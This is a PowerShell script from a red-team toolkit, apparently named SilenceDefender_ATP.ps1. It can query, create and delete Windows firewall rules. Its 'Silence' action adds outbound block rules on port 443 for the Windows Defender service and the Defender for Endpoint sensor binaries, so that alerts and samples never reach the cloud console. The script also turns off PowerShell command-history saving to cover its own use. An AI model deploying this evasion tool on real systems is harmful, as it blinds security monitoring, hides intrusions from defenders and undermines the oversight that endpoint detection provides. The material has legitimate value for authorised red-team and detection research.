<#
.SYNOPSIS
   Manage firewall rules - Or
   Silencing microsoft defender using firewall rules!

   Author: @r00t-3xp10it
   Credits to: csis-techblog
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: none
   PS cmdlet Dev version: v2.2.11

.DESCRIPTION
   This cmdlet allow users to Query\Create\Delete 'active' firewall rules OR to stop Microsoft Defender
   from sending samples (suspicious.amsistring) to Microsoft cloud by blocking the defender connection to
   the cloud using firewall outbound Block rules, but once those rules are removed the events and alerts
   will start showing up in Microsoft Defender security center. This cmdlet allows max of 3 diferent port
   inputs to be blocked by -LocalPort \ -RemotePort parameter declarations (split the ports with commas).

.NOTES
   Windows Defender for Endpoint (formerly Windows Defender ATP) is a so-called “cloud powered” EDR product,
   i.e. alerts and events are pushed to the cloud where defenders can respond to them. When doing Red Team
   assignments one of the biggest hurdles usually lie in evading EDR products and ensuring that our actions
   are not detected. While a lot of work and research has been put into evading and bypassing Windows Defender
   for Endpoint, little research explores the possibility of simply silencing MD for Endpoint such that no data
   is sent to the cloud.

.Parameter Action
   Accepts arguments: query, create, silence, delete (default: query)

.Parameter DisplayName
   The firewall rule DisplayName to query\create\delete (default: false)

.Parameter Program
   The Program to block (default: $Env:ProgramFiles\Mozilla Firefox\firefox.exe)

.Parameter RemotePort
   The Program port number to Block (default: Any)

.Parameter LocalPort
   The Program port number to Block (default: Any)

.Parameter Direction
   The TCP flow direction (default: Inbound)

.EXAMPLE
   PS C:\> Get-Help .\SilenceDefender_ATP.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action query
   List all 'active' firewall rules of remote system

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action query -DisplayName "Block 443"
   Query just for 'Block 443' active firewall rules string(s)

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Silence
   Silence Microsoft defender service from sending samples to the cloud.
   
.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Delete -DisplayName "Silence"
   Delete ALL the 'Block' rules added previously by the 'silence' function
   
.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Delete -DisplayName "Block 443 MsMpEng"
   Delete just the 'Block 443 MsMpEng' existing firewall rule DisplayName.

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Create -DisplayName "Block firefox" -LocalPort "80,443,445" -RemotePort "Any" -Program "$Env:ProgramFiles\Mozilla Firefox\firefox.exe" -Direction Inbound
   Create a new firewall rule that Blocks firefox.exe from connecting with remoteport 'Any' and localport '80,443,445' (Inbound).

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Create -DisplayName "Block-PS" -Program "$PSHOME\powershell.exe" -Direction Outbound
   Create a new firewall rule that Blocks powershell.exe from connecting with localport 'Any' and remoteport 'Any' (Outbound).

.INPUTS
   None. You cannot pipe objects into SilenceDefender.ps1

.OUTPUTS
   * Quering enabled firewall rules.
   Enabled Action Direction DisplayName                                                                                              
   ------- ------ --------- -----------                                                                                              
      True  Allow   Inbound Otimização da Entrega (TCP-In)                                                                           
      True  Allow   Inbound Otimização da Entrega (UDP-In)                                                                           
      True  Allow   Inbound Plataforma de Dispositivos Ligados (TCP de Entrada)                                                      
      True  Allow  Outbound Plataforma de Dispositivos Ligados (TCP de Saída)  
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   http://woshub.com/manage-windows-firewall-powershell
   https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Program="$Env:ProgramFiles\Mozilla Firefox\firefox.exe",
   [string]$Direction="Inbound",
   [string]$DisplayName="false",
   [string]$RemotePort="Any",
   [string]$LocalPort="Any",
   [string]$Action="Query"
)


Write-Host ""
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


If($Action -ieq "Query")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query 'ALL' active rules OR just the 'DisplayName' rule!
   #>

   #Quering ALL active firewall rules
   Write-Host "`n* Quering enabled firewall rules" -ForegroundColor Blue
   If($DisplayName -ieq "False")
   {
      #Query ALL active firewall rules
      $QueryRules = Get-NetFirewallRule | Where-Object {
         $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and
         $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
      } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize
   }
   Else
   {
      #Query just sellected DisplayName firewall rule
      $QueryRules = Get-NetFirewallRule | Where-Object {
         $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and $_.DisplayName -iMatch "$DisplayName" -and
         $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
      } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize
   }

   #Collect extra info about NetConnection
   Get-NetConnectionProfile | Select-Object InterfaceAlias,Name,NetworkCategory,IPv4Connectivity | Format-Table -AutoSize

}


If($Action -ieq "Create")
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create program\application 'Block' firewall rule!

   .NOTES
      Administrator privileges required to create firewall rules!
      This function allow users to block conections to LocalPort or RemotePort
      Inbound or Outbound and accepts the Program to be blocked full path input.
   #>

   Write-Host "* Create program\application 'Block' firewall rule!" -ForegroundColor Blue
   If($DisplayName -ieq "false" -or $DisplayName -ieq $null){$DisplayName = "Block-Firefox"}
   If(-not(Test-Path -Path "$Program" -ErrorAction SilentlyContinue))
   {
      Write-Host "   => Error: '$Program' not found .." -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }

   If(-not($IsClientAdmin))
   {
      Write-Host "   => Error: Administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }


   If($LocalPort -Match ',')
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Parse multiple Local Port numbers!

      .NOTES
         This function allow users to input more than one port number.
         This function does not accept more than 3 diferent port inputs.
      #>

      $StepOne = $LocalPort.Split(',')[0]
      $StepTwo = $LocalPort.Split(',')[1]
      $StepTre = $LocalPort.Split(',')[2]

      #Count how many ports have been input by user (max: 3)
      $HowMany = ($LocalPort.Split(',') | Measure-Object –Line).Lines
      If($HowMany -eq 2)
      {
         $IntPorts = @("$StepOne", "$StepTwo")     
      }
      ElseIf($HowMany -eq 3)
      {
         $IntPorts = @("$StepOne", "$StepTwo", "$StepTre")      
      }
      ElseIf($HowMany -gt 3)
      {
         Write-Host "   => Error: More than 3 multiple ports sellected .." -ForegroundColor Yellow
         $IntPorts = @("$StepOne", "$StepTwo", "$StepTre")          
      }
   }
   Else
   {
      $IntPorts = "$LocalPort"
   }

   If($RemotePort -Match ',')
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Parse multiple Remote Port numbers!

      .NOTES
         This function allow users to input more than one port number.
         This function does not accept more than 3 diferent port inputs.
      #>

      $StepOne = $RemotePort.Split(',')[0]
      $StepTwo = $RemotePort.Split(',')[1]
      $StepTre = $RemotePort.Split(',')[2]

      #Count how many ports have been input by user (max: 3)
      $HowMutch = ($RemotePort.Split(',') | Measure-Object –Line).Lines
      If($HowMutch -eq 2)
      {
         $OutPorts = @("$StepOne", "$StepTwo")     
      }
      ElseIf($HowMutch -eq 3)
      {
         $OutPorts = @("$StepOne", "$StepTwo", "$StepTre")      
      }
      ElseIf($HowMutch -gt 3)
      {
         Write-Host "   => Error: More than 3 multiple ports sellected." -ForegroundColor Yellow
         $IntPorts = @("$StepOne", "$StepTwo", "$StepTre")          
      }
   }
   Else
   {
      $OutPorts = "$RemotePort"
   }


   try{#Create new firewall 'Block' rule
      New-NetFirewallRule -DisplayName "$DisplayName" -Name "$DisplayName" -Direction $Direction -Program "$Program" -LocalPort $IntPorts -RemotePort $OutPorts -Protocol TCP -Action Block -EA SilentlyContinue|Out-Null
   }catch{#fail to create the new Block firewall rule ..
      Write-Host "   => Error: fail to create firewall block rule." -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit @SilenceDefender_ATP
   }


   $QueryRules = Get-NetFirewallRule -DisplayName "$DisplayName" |
      Format-Table -Property Enabled, DisplayName, Direction, Action,
      @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
      @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}
   }, Profile

   #Display output Table OnScreen
   echo $QueryRules | Format-Table -AutoSize | Out-String -Stream | Select -Skip 1 | ForEach-Object {
      $stringformat = If($_ -Match '^(Enabled)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match 'Block')
      {
         @{ 'ForegroundColor' = 'Yellow' }      
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }
   Exit #Exit @SilenceDefender_ATP

}


If($Action -ieq "Silence")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Silence Microsoft Defender from sending samples to the cloud!

   .NOTES
      Administrator privileges required to add firewall rules!
   #>

   Write-Host "* Silence Defender from sending samples to the cloud!" -ForegroundColor Blue
   If(-not($IsClientAdmin))
   {
      Write-Host "  => Error: Administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }


   try{#Create Microsoft Defender firewall 'Block' rules
      New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block -EA SilentlyContinue|Out-Null
      New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block -EA SilentlyContinue|Out-Null
      New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block -EA SilentlyContinue|Out-Null
   }catch{#fail to create Microsoft Defender firewall block rules ..
      Write-Host "  => Error: fail to create the firewall block rules." -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";exit #Exit @SilenceDefender_ATP
   }


   Start-Sleep -Milliseconds 700
   #Check if the rules was successfuly added
   $QueryRules = Get-NetFirewallRule | Where-Object {
      $_.Action -iMatch '^(Block)$' -and $_.DisplayName -Match '^(Block 443)'
   } | Format-Table -Property Enabled, DisplayName, Direction, Action,
      @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
      @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, Profile

}


If($Action -ieq "Delete")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete firewall rules added by this cmdlet OR by is DisplayName!

   .NOTES
      Administrator privileges required to delete firewall rules!
      This function deletes firewall rules added by this cmdlet
      (silence function) Or delete sellected rule by is DisplayName.
   #>

   If(-not($IsClientAdmin))
   {
      Write-Host "`n* Removing microsoft defender firewall rules!" -ForegroundColor Blue
      Write-Host "  => Error: Administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }

   If($DisplayName -ieq "Silence")
   {
      try{#Removing microsoft defender firewall rules!
         Write-Host "`n* Removing microsoft defender firewall rules!" -ForegroundColor Blue
         Remove-NetFirewallRule -DisplayName "Block 443 MsMpEng" -ErrorAction SilentlyContinue
         Remove-NetFirewallRule -DisplayName "Block 443 MsSense" -ErrorAction SilentlyContinue
         Remove-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -ErrorAction SilentlyContinue
      }catch{#fail to remove the firewall block rule ..
         Write-Host "  => Error: fail to remove firewall rule(s) .." -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";Exit #Exit @SilenceDefender_ATP
      }
   }
   Else
   {
      try{#Delete firewall rule by is DisplayName!
         Write-Host "`n* Deleting '$DisplayName' firewall rule!" -ForegroundColor Blue
         Remove-NetFirewallRule -DisplayName "$DisplayName" -ErrorAction SilentlyContinue
      }catch{#fail to delete the firewall block rule ..
         Write-Host "  => Error: fail to delete '$DisplayName' firewall rule .." -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";Exit #Exit @SilenceDefender_ATP
      }
   }

   #Query firewall rules
   Start-Sleep -Milliseconds 700
   $QueryRules = Get-NetFirewallRule | Where-Object {
      $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and
      $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
   } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize

}



If($QueryRules)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display Onscreen Output Table!
   #>

   echo $QueryRules | Format-Table -AutoSize | Out-String -Stream | Select -Skip 1 | ForEach-Object {
      $stringformat = If($_ -Match '^(Enabled)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match 'Block')
      {
         @{ 'ForegroundColor' = 'Red' }      
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }
}
Else
{
   Write-Host "   Error: None firewall rule found matching the criteria entered!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "`n"
}